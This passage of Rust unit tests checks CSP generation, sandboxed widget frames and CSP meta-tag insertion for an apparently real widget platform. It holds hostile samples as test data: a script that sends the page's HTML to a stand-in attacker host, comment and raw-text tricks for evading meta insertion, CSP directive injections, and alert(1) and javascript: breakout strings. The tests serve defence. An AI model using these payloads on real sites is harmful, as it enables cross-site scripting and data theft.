                    assert_eq!(present, name == directive.csp_name(), "{source} in {name}");
                }
            }
        }
        assert!(sources_of(&csp, "script-src").contains(&"'wasm-unsafe-eval'".to_string()));
        assert_eq!(
            sources_of(&csp, "worker-src"),
            vec!["blob:".to_string(), desktop_bundle()[0].clone()]
        );
        assert!(csp.ends_with("sandbox allow-scripts allow-downloads"));
    }

    #[test]
    fn invalid_bundle_sources_and_invalid_policies_are_never_emitted() {
        let hostile_bundles: Vec<String> = [
            "'self'",
            "*",
            "https:",
            "https://api.flow-like.com/",
            "https://api.flow-like.com",
            "https://api.flow-like.com/api/v1/x",
            "https://api.flow-like.com/api/v1/x; script-src *",
            "https://api.flow-like.com/api/v1 x/",
            "https://api.flow-like.com/api/v1\t/",
            "https://api.flow-like.com/api/'v1'/",
            "https://api.flow-like.com/api/../v1/",
            "https://api.flow-like.com/api/%2e%2E/v1/",
            "https://api.flow-like.com/api/a%2Fb/",
            "https://api.flow-like.com/api/%zz/",
            "https://api.flow-like.com//v1/",
            "https://user@api.flow-like.com/v1/",
            "https://api.flow-like.com:99999/v1/",
            "https://[::1]/v1/",
            "HTTPS://api.flow-like.com/v1/",
            "https://api.flow-like.com/v1/?x=1/",
            "https://api.flow-like.com/v1/#x/",
            "https://api.flow-like.com/vé/",
        ]
        .into_iter()
        .map(str::to_string)
        .collect();
        let csp = widget_document_csp(&hostile_bundles, &WidgetPolicy::default(), true, true);
        assert_eq!(
            csp,
            widget_document_csp(&[], &WidgetPolicy::default(), true, true),
            "every hostile bundle source must be dropped"
        );
        assert_well_formed(&csp, Some(&WidgetPolicy::default()));

        let accepted: Vec<String> = [
            "https://api.flow-like.com/api/v1/registry/package/com.example.maps/widget-sandbox/1.2.0%2Bbuild.1/",
            "http://localhost:8080/api/v1/registry/package/pkg/widget-sandbox/1.0.0/",
            "http://flow-widget.localhost/com.example.maps/abc/",
            "flow-widget://localhost/com.example.maps/abc/",
        ]
        .into_iter()
        .map(str::to_string)
        .collect();
        for source in &accepted {
            assert!(is_bundle_source(source), "{source}");
        }
        let duplicated = [accepted.clone(), accepted.clone()].concat();
        let workers = WidgetPolicy {
            workers: true,
            media: true,
            ..WidgetPolicy::default()
        };
        let csp = widget_document_csp(&duplicated, &workers, true, false);
        assert_eq!(sources_of(&csp, "font-src").len(), 1 + accepted.len());
        assert_eq!(sources_of(&csp, "connect-src").len(), 2 + accepted.len());
        assert_eq!(sources_of(&csp, "worker-src").len(), 1 + accepted.len());
        assert_eq!(sources_of(&csp, "media-src").len(), 2 + accepted.len());
        assert_well_formed(&csp, Some(&workers));

        let mut injected = map_policy();
        injected.csp.connect_src = vec!["https://a.example.org; script-src *".into()];
        let csp = widget_document_csp(&desktop_bundle(), &injected, true, true);
        assert_well_formed(&csp, None);
        assert!(!csp.contains("example.org"));
        assert!(!csp.contains("maptiler"));
        assert!(!csp.contains("fonts.g"));

        let mut unsorted = map_policy();
        unsorted.csp.connect_src.reverse();
        assert!(
            !widget_document_csp(&desktop_bundle(), &unsorted, true, true).contains("maptiler")
        );
    }

    #[test]
    fn asset_csp_is_locked() {
        assert_eq!(WIDGET_ASSET_CSP, "default-src 'none'; sandbox");
        assert_well_formed(WIDGET_ASSET_CSP, None);
    }

    #[test]
    fn frame_csp_pins_exact_child_urls() {
        let child = format!(
            "flow-widget://localhost/com.example.maps/{HASH}/widgets/live-map/index.0.html"
        );
        let web_child = "https://api.flow-like.com/api/v1/registry/package/com.example.maps/widget-sandbox/1.2.0/widgets/live-map/index.eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJ4In0.c2ln.html".to_string();
        let csp = widget_frame_csp(&[child.clone(), web_child.clone()], false);
        assert_eq!(
            csp,
            format!(
                "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; frame-src {child} {web_child}; base-uri 'none'; form-action 'none'; sandbox allow-scripts"
            )
        );
        assert_well_formed(&csp, None);
        assert!(
            widget_frame_csp(std::slice::from_ref(&child), true)
                .ends_with("sandbox allow-scripts allow-downloads")
        );

        let prefixes: Vec<String> = vec![
            format!("flow-widget://localhost/com.example.maps/{HASH}/"),
            "flow-widget:".into(),
            "'self'".into(),
            format!("{child} https://evil.example.org"),
            format!("{child};frame-src *"),
        ];
        let csp = widget_frame_csp(&prefixes, false);
        assert!(csp.contains("frame-src 'none'"));
        assert_well_formed(&csp, None);
    }

    #[test]
    fn wrapper_builds_the_child_in_a_closed_shadow_root_and_only_relays() {
        let document = widget_frame_document("../../", "live-map", "0", None, false).unwrap();
        assert!(document.contains("attachShadow({mode:'closed'})"));
        assert!(document.contains("frame.setAttribute('sandbox','allow-scripts');"));
        assert!(document.contains("frame.setAttribute('referrerpolicy','no-referrer');"));
        assert!(
            document.contains("frame.setAttribute('src','../../widgets/live-map/index.0.html');")
        );
        assert!(!document.contains("<iframe"));
        assert!(!document.contains("'name'") && !document.contains(".name"));
        assert!(document.contains("if(e.source===parent)child.postMessage(e.data,'*',transfer);"));
        assert!(
            document.contains("else if(e.source===child)parent.postMessage(e.data,'*',transfer);")
        );
        assert!(document.contains("bytes instanceof ArrayBuffer?[bytes]:[]"));
        assert!(!document.contains("fetch("));
        assert!(!document.contains("frames"));

        let grant = "f".repeat(64);
        let downloads = widget_frame_document("../../", "live-map", &grant, None, true).unwrap();
        assert!(
            downloads.contains("frame.setAttribute('sandbox','allow-scripts allow-downloads');")
        );
        assert!(downloads.contains(&format!(
            "frame.setAttribute('src','../../widgets/live-map/index.{grant}.html');"
        )));

        let absolute = widget_frame_document(
            "https://api.flow-like.com/api/v1/registry/package/pkg/widget-sandbox/1.0.0/",
            "live-map",
            "0",
            None,
            false,
        )
        .unwrap();
        assert!(absolute.contains("frame.setAttribute('src','https://api.flow-like.com/api/v1/registry/package/pkg/widget-sandbox/1.0.0/widgets/live-map/index.0.html');"));

        let runtime = encode_runtime_component(&BTreeMap::from([(
            "tileUrl".to_string(),
            vec!["https://a.tiles.example.com".to_string()],
        )]))
        .unwrap();
        let carried =
            widget_frame_document("../../", "live-map", WEB_TOKEN, Some(&runtime), false).unwrap();
        assert!(carried.contains(&format!(
            "frame.setAttribute('src','../../widgets/live-map/index.{WEB_TOKEN}~{runtime}.html');"
        )));
        assert!(widget_frame_document("", "live-map", "0", None, false).is_some());
    }

    #[test]
    fn wrapper_refuses_unsafe_child_sources() {
        for child_base in [
            "/",
            "../../widgets/x');alert(1);('/",
            "../../x\"/",
            "../../x</script>/",
            "../../x\\y/",
            "../ ../",
            "javascript:alert(1)/",
            "data:text/html,hi/",
            "flow-widget:",
            "https://evil.example.org",
            "https://evil.example.org:0/",
            "//evil.example.org/",
            "./",
            "..",
        ] {
            assert!(
                widget_frame_document(child_base, "live-map", "0", None, false).is_none(),
                "must refuse {child_base:?}"
            );
        }
        let tilde_grant = format!("{WEB_TOKEN}~abcd");
        for (widget_id, grant, runtime) in [
            ("", "0", None),
            ("live map", "0", None),
            ("x');alert(1);('", "0", None),
            ("..", "0", None),
            ("live-map", "", None),
            ("live-map", "1", None),
            ("live-map", "0", Some("eyJ0IjpbXX0")),
            ("live-map", WEB_TOKEN, Some("")),
            ("live-map", WEB_TOKEN, Some("a~b")),
            ("live-map", WEB_TOKEN, Some("abc=")),
            ("live-map", WEB_TOKEN, Some("a'b")),
            ("live-map", tilde_grant.as_str(), None),
        ] {
            assert!(
                widget_frame_document("../../", widget_id, grant, runtime, false).is_none(),
                "must refuse {widget_id:?} {grant:?} {runtime:?}"
            );
        }
    }

    const WEB_TOKEN: &str = "eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJ4In0.c2ln-_";

    fn tile_slots() -> BTreeMap<String, Vec<String>> {
        BTreeMap::from([
            (
                "layers[].url".to_string(),
                vec![
                    "https://s3.eu-central-1.amazonaws.com/flow-like-content/apps/app_1/"
                        .to_string(),
                ],
            ),
            (
                "tileUrl".to_string(),
                vec![
                    "https://a.tiles.example.com".to_string(),
                    "wss://live.example.com".to_string(),
                ],
            ),
        ])
    }

    #[test]
    fn runtime_components_encode_canonical_slots_strictly() {
        let slots = tile_slots();
        let component = encode_runtime_component(&slots).unwrap();
        assert_eq!(
            URL_SAFE_NO_PAD.decode(&component).unwrap(),
            runtime_slots_canonical_json(&slots).as_bytes()
        );
        assert!(is_runtime_component(&component));
        assert!(!component.contains(['=', '+', '/', '~', '.']));
        assert_eq!(decode_runtime_component(&component), Ok(slots.clone()));

        assert_eq!(
            encode_runtime_component(&BTreeMap::new()),
            Err(RuntimeComponentError::Empty)
        );
        for invalid in [
            BTreeMap::from([("tileUrl".to_string(), Vec::new())]),
            BTreeMap::from([(
                "tileUrl".to_string(),
                vec![
                    "https://b.example.com".to_string(),
                    "https://a.example.com".to_string(),
                ],
            )]),
            BTreeMap::from([(
                "tileUrl".to_string(),
                vec![
                    "https://a.example.com".to_string(),
                    "https://a.example.com".to_string(),
                ],
            )]),
            BTreeMap::from([(
                "tile url".to_string(),
                vec!["https://a.example.com".to_string()],
            )]),
        ] {
            assert_eq!(
                encode_runtime_component(&invalid),
                Err(RuntimeComponentError::NotCanonical)
            );
        }

        let host = |index: usize| format!("https://h{index}-{}.example.com", "a".repeat(40));
        let mut large = BTreeMap::new();
        large.insert("tileUrl".to_string(), (0..8).map(host).collect::<Vec<_>>());
        let json_len = runtime_slots_canonical_json(&large).len();
        assert!(json_len <= MAX_WIDGET_RUNTIME_BYTES, "{json_len}");
        let fitting = encode_runtime_component(&large).unwrap();
        assert!(fitting.len() <= MAX_RUNTIME_COMPONENT_LEN);
        let mut more: Vec<String> = (8..16).map(host).collect();
        more.sort();
        large.insert("videoUrl".to_string(), more);
        assert_eq!(
            encode_runtime_component(&large),
            Err(RuntimeComponentError::TooLarge)
        );
        assert_eq!(MAX_RUNTIME_COMPONENT_LEN, 1366);
    }

    #[test]
    fn runtime_components_decode_only_their_canonical_encoding() {
        let canonical = runtime_slots_canonical_json(&tile_slots());
        let reordered = "{\"tileUrl\":[\"https://a.tiles.example.com\",\"wss://live.example.com\"],\"layers[].url\":[\"https://s3.eu-central-1.amazonaws.com/flow-like-content/apps/app_1/\"]}";
        let spaced = canonical.replace(',', ", ");
        let unsorted = "{\"tileUrl\":[\"wss://live.example.com\",\"https://a.tiles.example.com\"]}";
        let duplicate_key =
            "{\"tileUrl\":[\"https://a.example.com\"],\"tileUrl\":[\"https://b.example.com\"]}";
        for text in [reordered, spaced.as_str(), unsorted, duplicate_key] {
            assert_eq!(
                decode_runtime_component(&URL_SAFE_NO_PAD.encode(text)),
                Err(RuntimeComponentError::NotCanonical),
                "{text}"
            );
        }
        for text in [
            "[]",
            "{\"tileUrl\":\"https://a.example.com\"}",
            "{\"tileUrl\":[1]}",
            "not json",
        ] {
            assert_eq!(
                decode_runtime_component(&URL_SAFE_NO_PAD.encode(text)),
                Err(RuntimeComponentError::Malformed),
                "{text}"
            );
        }
        assert_eq!(
            decode_runtime_component(&URL_SAFE_NO_PAD.encode("{}")),
            Err(RuntimeComponentError::Empty)
        );
        let component = encode_runtime_component(&tile_slots()).unwrap();
        assert_eq!(
            URL_SAFE_NO_PAD.decode(&component).unwrap(),
            canonical.as_bytes()
        );
        for tampered in [
            format!("{component}="),
            format!("+{}", &component[1..]),
            format!("/{}", &component[1..]),
            format!("{component}~"),
        ] {
            assert_eq!(
                decode_runtime_component(&tampered),
                Err(RuntimeComponentError::Malformed),
                "{tampered}"
            );
        }
        let mut trailing = component.clone();
        trailing.pop();
        assert!(decode_runtime_component(&trailing).is_err());
        assert_eq!(
            decode_runtime_component(""),
            Err(RuntimeComponentError::Empty)
        );
        assert_eq!(
            decode_runtime_component(&"A".repeat(MAX_RUNTIME_COMPONENT_LEN + 1)),
            Err(RuntimeComponentError::TooLarge)
        );
        assert_eq!(RuntimeComponentError::NotCanonical.code(), "not-canonical");
    }

    #[test]
    fn grant_segments_split_and_build_with_runtime_components() {
        let runtime = encode_runtime_component(&tile_slots()).unwrap();
        let segment = format!("{WEB_TOKEN}~{runtime}");
        assert_eq!(
            split_grant_segment(&segment),
            Some((WEB_TOKEN, Some(runtime.as_str())))
        );
        assert_eq!(split_grant_segment(WEB_TOKEN), Some((WEB_TOKEN, None)));
        assert_eq!(split_grant_segment("0"), Some(("0", None)));
        let desktop = "f".repeat(64);
        assert_eq!(
            split_grant_segment(&format!("{desktop}~{runtime}")),
            Some((desktop.as_str(), Some(runtime.as_str())))
        );
        for invalid in [
            format!("0~{runtime}"),
            format!("{WEB_TOKEN}~"),
            format!("~{runtime}"),
            format!("{WEB_TOKEN}~{runtime}~{runtime}"),
            format!("{WEB_TOKEN}~{runtime}="),
            format!("{WEB_TOKEN}~{}", "A".repeat(MAX_RUNTIME_COMPONENT_LEN + 1)),
            format!("{WEB_TOKEN}~A"),
            "1".to_string(),
            String::new(),
        ] {
            assert_eq!(split_grant_segment(&invalid), None, "{invalid}");
        }
        assert!(!is_grant_segment(&segment));

        assert_eq!(
            widget_frame_path("live-map", WEB_TOKEN, Some(&runtime)),
            Some(format!("frame/live-map/{segment}"))
        );
        assert_eq!(
            widget_document_path("live-map", WEB_TOKEN, Some(&runtime)),
            Some(format!("widgets/live-map/index.{segment}.html"))
        );
        assert_eq!(
            widget_document_path("live-map", "0", None),
            Some("widgets/live-map/index.0.html".to_string())
        );
        assert_eq!(widget_frame_path("live-map", "0", Some(&runtime)), None);
        assert_eq!(widget_frame_path("live map", "0", None), None);
        assert_eq!(widget_document_path("live-map", "nope", None), None);

        let sources = vec![
            "https://api.flow-like.com/api/v1/registry/package/pkg/widget-sandbox/1.0.0/"
                .to_string(),
            "https://app.flow-like.com/api/v1/registry/package/pkg/widget-sandbox/1.0.0/"
                .to_string(),
            "https://api.flow-like.com/api/v1/registry/package/pkg/widget-sandbox/1.0.0/"
                .to_string(),
            "'self'".to_string(),
        ];
        let urls = widget_child_document_urls(&sources, "live-map", WEB_TOKEN, Some(&runtime));
        assert_eq!(
            urls,
            vec![
                format!(
                    "https://api.flow-like.com/api/v1/registry/package/pkg/widget-sandbox/1.0.0/widgets/live-map/index.{segment}.html"
                ),
                format!(
                    "https://app.flow-like.com/api/v1/registry/package/pkg/widget-sandbox/1.0.0/widgets/live-map/index.{segment}.html"
                ),
            ]
        );
        let csp = widget_frame_csp(&urls, false);
        assert!(csp.contains(&format!("index.{segment}.html https://app.flow-like.com")));
        assert_well_formed(&csp, None);
        assert!(widget_child_document_urls(&sources, "live-map", "0", Some(&runtime)).is_empty());
    }

    #[test]
    fn meta_is_inserted_after_a_leading_doctype_and_replaces_existing_csp_metas() {
        let csp = "default-src 'none'; img-src data:";
        let meta = "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; img-src data:\">";

        let html = b"<!DOCTYPE html>\n<html><head><meta charset=\"utf-8\"><META HTTP-EQUIV='content-security-policy' CONTENT=\"default-src *\"></head><body>hi</body></html>";
        let out = String::from_utf8(inject_document_csp_meta(html, csp)).unwrap();
        assert_eq!(
            out,
            format!(
                "<!DOCTYPE html>{meta}\n<html><head><meta charset=\"utf-8\"></head><body>hi</body></html>"
            )
        );

        let bare =
            b"<html><body><meta http-equiv=Content-Security-Policy content=x/>ok</body></html>";
        let out = String::from_utf8(inject_document_csp_meta(bare, csp)).unwrap();
        assert_eq!(out, format!("{meta}<html><body>ok</body></html>"));

        let variants = concat!(
            "<!doctype html>",
            "<meta\thttp-equiv = \"CONTENT-SECURITY-POLICY\" content=\"a\">",
            "<meta/http-equiv=\"content-security-policy\"/content=\"b\">",
            "<meta content=\"c > d\" http-equiv=\"content-security-policy\">",
            "<meta content='x' data-x=\"http-equiv=content-security-policy\">",
            "<meta http-equiv=\"refresh\" content=\"0\">",
            "<meta http-equiv=\"content-security-policy-report-only\" content=\"e\">",
            "<metadata http-equiv=\"content-security-policy\">",
            "<meta name='<meta http-equiv=content-security-policy>'>",
        );
        let out = String::from_utf8(inject_document_csp_meta(variants.as_bytes(), csp)).unwrap();
        assert_eq!(
            out,
            format!(
                "<!doctype html>{meta}<meta content='x' data-x=\"http-equiv=content-security-policy\"><meta http-equiv=\"refresh\" content=\"0\"><meta http-equiv=\"content-security-policy-report-only\" content=\"e\"><metadata http-equiv=\"content-security-policy\"><meta name='<meta http-equiv=content-security-policy>'>"
            )
        );
        assert_eq!(
            out.matches("http-equiv=\"Content-Security-Policy\"")
                .count(),
            1
        );
    }

    #[test]
    fn meta_stripping_is_a_single_linear_pass() {
        let csp = "default-src 'none'";
        let joined = b"<me<meta http-equiv=\"content-security-policy\" content=\"f\">ta http-equiv=\"content-security-policy\" content=\"g\">";
        let out = String::from_utf8(inject_document_csp_meta(joined, csp)).unwrap();
        assert!(out.ends_with("<meta http-equiv=\"content-security-policy\" content=\"g\">"));

        let hostile = [
            b"<meta a=\"".repeat(200_000),
            b"<meta x=y>".repeat(200_000),
            b"<meta ".repeat(200_000),
        ];
        for html in hostile {
            let started = std::time::Instant::now();
            let out = inject_document_csp_meta(&html, csp);
            assert!(out.ends_with(&html[html.len() - 16..]));
            assert!(started.elapsed() < std::time::Duration::from_secs(5));
        }
    }

    #[test]
    fn meta_insertion_respects_bom_comments_and_unterminated_tags() {
        let csp = "default-src 'none'";
        let meta = "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'\">";

        let bom = b"\xEF\xBB\xBF<!doctype html><p>x</p>";
        let out = inject_document_csp_meta(bom, csp);
        assert_eq!(
            out,
            [
                b"\xEF\xBB\xBF<!doctype html>".as_slice(),
                meta.as_bytes(),
                b"<p>x</p>"
            ]
            .concat()
        );

        let bom_only = b"\xEF\xBB\xBF<p>x</p>";
        let out = inject_document_csp_meta(bom_only, csp);
        assert_eq!(
            out,
            [b"\xEF\xBB\xBF".as_slice(), meta.as_bytes(), b"<p>x</p>"].concat()
        );

        let commented = b"  <!-- built --><!-->\n<!doctype html><p>x</p>";
        let out = String::from_utf8(inject_document_csp_meta(commented, csp)).unwrap();
        assert_eq!(
            out,
            format!("{meta}  <!-- built --><!-->\n<!doctype html><p>x</p>")
        );

        let spaced = b" \t\r\n\x0c<!DOCTYPE html>\n<p>x</p>";
        let out = String::from_utf8(inject_document_csp_meta(spaced, csp)).unwrap();
        assert_eq!(out, format!(" \t\r\n\x0c<!DOCTYPE html>{meta}\n<p>x</p>"));

        let bom_spaced = b"\xEF\xBB\xBF\n<!doctype html><p>x</p>";
        let out = inject_document_csp_meta(bom_spaced, csp);
        assert_eq!(
            out,
            [
                b"\xEF\xBB\xBF\n<!doctype html>".as_slice(),
                meta.as_bytes(),
                b"<p>x</p>"
            ]
            .concat()
        );

        for not_whitespace in [
            b"\x0b<!doctype html><p>x</p>".as_slice(),
            b"\0<!doctype html><p>x</p>",
            b"\xC2\xA0<!doctype html><p>x</p>",
            b"x<!doctype html><p>x</p>",
            b"\xEF\xBB\xBF\xEF\xBB\xBF<!doctype html><p>x</p>",
        ] {
            let out = inject_document_csp_meta(not_whitespace, csp);
            let offset = usize::from(not_whitespace.starts_with(b"\xEF\xBB\xBF")) * 3;
            assert_eq!(
                out,
                [
                    &not_whitespace[..offset],
                    meta.as_bytes(),
                    &not_whitespace[offset..]
                ]
                .concat(),
                "{not_whitespace:?}"
            );
        }

        let utf16_bom = b"\xFF\xFE<\0!\0d\0o\0c\0t\0y\0p\0e\0 \0h\0t\0m\0l\0>\0";
        let out = inject_document_csp_meta(utf16_bom, csp);
        assert_eq!(out, [meta.as_bytes(), utf16_bom.as_slice()].concat());

        let late_doctype = b"<p>x</p><!doctype html>";
        let out = String::from_utf8(inject_document_csp_meta(late_doctype, csp)).unwrap();
        assert!(out.starts_with(meta));

        let unterminated =
            b"<!doctype html><meta http-equiv=\"content-security-policy\" content=\"x";
        let out = String::from_utf8(inject_document_csp_meta(unterminated, csp)).unwrap();
        assert_eq!(
            out,
            format!(
                "<!doctype html>{meta}<meta http-equiv=\"content-security-policy\" content=\"x"
            )
        );

        let escaped = String::from_utf8(inject_document_csp_meta(b"", "a\"b<c>&d")).unwrap();
        assert_eq!(
            escaped,
            "<meta http-equiv=\"Content-Security-Policy\" content=\"a&quot;b&lt;c&gt;&amp;d\">"
        );
    }

    #[test]
    fn meta_is_never_placed_after_a_leading_comment_or_raw_text_element() {
        let csp = "default-src 'none'";
        let meta = "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'\">";
        let exfiltrate = "<script>fetch('https://attacker.example/?d='+encodeURIComponent(document.documentElement.outerHTML))</script>";

        for (payload, raw_text_tag) in [
            ("<!-- --!><title>--><!doctype html></title>", "<title>"),
            ("<!----!><script>--><!doctype html></script>", "<script>"),
            (
                "<!-- --!><textarea>--><!doctype html></textarea>",
                "<textarea>",
            ),
            ("<!-- <!--!><style>--><!doctype html></style>", "<style>"),
            ("<!--><title>--><!doctype html></title>", "<title>"),
            ("<!--->\n<title>--><!doctype html></title>", "<title>"),
            ("<!-- --><!doctype html>", "<!doctype"),
        ] {
            let html = format!("{payload}{exfiltrate}");
            let out = String::from_utf8(inject_document_csp_meta(html.as_bytes(), csp)).unwrap();
            assert_eq!(out, format!("{meta}{html}"), "{payload:?}");
            assert!(
                out.find(meta).unwrap() < out.find(raw_text_tag).unwrap(),
                "{payload:?}"
            );
        }

        let bom = format!("\u{feff}<!-- --!><title>--><!doctype html></title>{exfiltrate}");
        let out = String::from_utf8(inject_document_csp_meta(bom.as_bytes(), csp)).unwrap();
        assert_eq!(out, format!("\u{feff}{meta}{}", &bom[3..]));
    }

    #[test]
    fn package_ids_bundle_hashes_and_grant_segments() {
        for id in ["com.example.maps", "my_pkg-1", "A.b"] {
            assert!(is_valid_package_id(id), "{id}");
        }
        for id in [
            "", ".", "..", "a b", "a;b", "a\"b", "a'b", "a/b", "a%2fb", "é",
        ] {
            assert!(!is_valid_package_id(id), "{id:?}");
        }

        assert!(is_valid_bundle_hash(HASH));
        assert!(!is_valid_bundle_hash(&HASH.to_uppercase()));
        assert!(!is_valid_bundle_hash(&HASH[..63]));
        assert!(!is_valid_bundle_hash(&format!("{}g", &HASH[..63])));

        assert!(is_desktop_grant_id(HASH));
        assert!(!is_desktop_grant_id("0"));

        let jwt = "eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJ4In0.c2ln-_";
        assert!(is_web_grant_token(jwt));
        for token in [
            "", "0", "a.b", "a.b.c.d", ".b.c", "a..c", "a.b.c=", "a.b.c/", "a.b c.d",
        ] {
            assert!(!is_web_grant_token(token), "{token:?}");
        }
        let long = format!(
            "{}.{}.{}",
            "a".repeat(1000),
            "b".repeat(1000),
            "c".repeat(46)
        );
        assert!(long.len() == MAX_WEB_GRANT_TOKEN_LEN && is_web_grant_token(&long));
        assert!(!is_web_grant_token(&format!("{long}c")));

        assert!(is_grant_segment("0"));
        assert!(is_grant_segment(HASH));
        assert!(is_grant_segment(jwt));
        assert!(!is_grant_segment("1"));
        assert!(!is_grant_segment("index"));
    }

    #[test]
    fn only_single_segment_frame_widget_ids() {
        assert!(is_frame_widget_id("sales-chart"));
        assert!(is_frame_widget_id("kpi_card.v2"));
        assert!(!is_frame_widget_id(""));
        assert!(!is_frame_widget_id("a/b"));
        assert!(!is_frame_widget_id(".."));
        assert!(!is_frame_widget_id("x\"onload=\"alert(1)"));
    }
}
